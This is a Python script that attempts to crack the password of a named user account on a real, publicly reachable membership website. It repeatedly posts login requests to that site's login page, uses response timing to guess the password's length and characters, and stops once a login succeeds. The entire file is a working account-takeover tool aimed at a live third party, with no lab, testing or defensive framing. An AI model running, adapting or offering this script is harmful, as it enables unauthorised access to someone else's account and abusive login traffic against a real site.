import itertools
import random
import string
import timeit
import requests
import numpy as np

allowed_chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!\"?$%^&)."

#try to login as tom1 with password
def login(password):
    pload = {
        'log': 'tom1',
        'pwd': password,
        'wp-submit': 'Log+In',
        'redirect_to': 'https%3A%2F%2Fwww.sapphirefoxx.com%2F',
        'mepr_process_login_form': 'true',
        'mepr_is_login_page': 'true'}
    r = requests.post("https://www.sapphirefoxx.com/login-2/", data=pload)
    return r.url != "https://www.sapphirefoxx.com/login-2/"

#give a random password at length size
def random_str(size):
    return ''.join(random.choices(allowed_chars, k=size))

#
def crack_length(max_len=32, verbose=False) -> int:
    trials = 10
    times = np.empty(max_len)
    for i in range(max_len):
        print("check length: ", i)
        i_time = timeit.repeat(stmt='login(password)',
                               setup=f'password=random_str({i!r})',
                               globals=globals(),
                               number=trials,
                               repeat=1)
        times[i] = min(i_time)

    if verbose:
        most_likely_n = np.argsort(times)[::-1][:5]
        print(most_likely_n, times[most_likely_n] / times[most_likely_n[0]])

    most_likely = int(np.argmax(times))
    return most_likely


def crack_password(length, verbose=False):
    guess = random_str(length)
    counter = itertools.count()
    trials = 100
    while True:
        i = next(counter) % length
        for c in allowed_chars:
            alt = guess[:i] + c + guess[i + 1:]

            alt_time = timeit.repeat(stmt='login(password)',
                                     setup=f'password={alt!r}',
                                     globals=globals(),
                                     number=trials,
                                     repeat=10)
            guess_time = timeit.repeat(stmt='login(password)',
                                       setup=f'password={guess!r}',
                                       globals=globals(),
                                       number=trials,
                                       repeat=10)

            if login(alt):
                return alt

            if min(alt_time) > min(guess_time):
                guess = alt
                if verbose:
                    print(guess)


def main():
    length = crack_length(verbose=True)
    print(f"using most likely length {length}")
    password = crack_password(length, verbose=True)
    print(f"password cracked:'{password}'")


if __name__ == '__main__':
    main()
